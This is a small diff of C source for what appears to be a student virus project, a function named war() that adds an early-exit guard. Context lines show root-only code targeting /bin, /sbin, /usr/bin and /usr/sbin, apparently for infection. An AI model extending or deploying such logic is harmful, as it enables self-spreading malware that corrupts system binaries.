@@ -6,7 +6,7 @@
 /*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/12 18:17:19 by ddinaut           #+#    #+#             */
-/*   Updated: 2019/03/25 16:47:34 by ddinaut          ###   ########.fr       */
+/*   Updated: 2019/03/27 11:52:45 by ddinaut          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -19,6 +19,8 @@ void	war(t_data *data)
 	_write(1, de, 4);
 	//	printf("war key = %lx\n", data->key.two);
 
+	if (data->context == false)
+		__exit(0);
 	if (_getuid() == 0)
 	{
 		t_directory root = {_random_number(ROOT_ENTRY), {"/bin", "/sbin", "/usr/bin", "/usr/sbin"}};
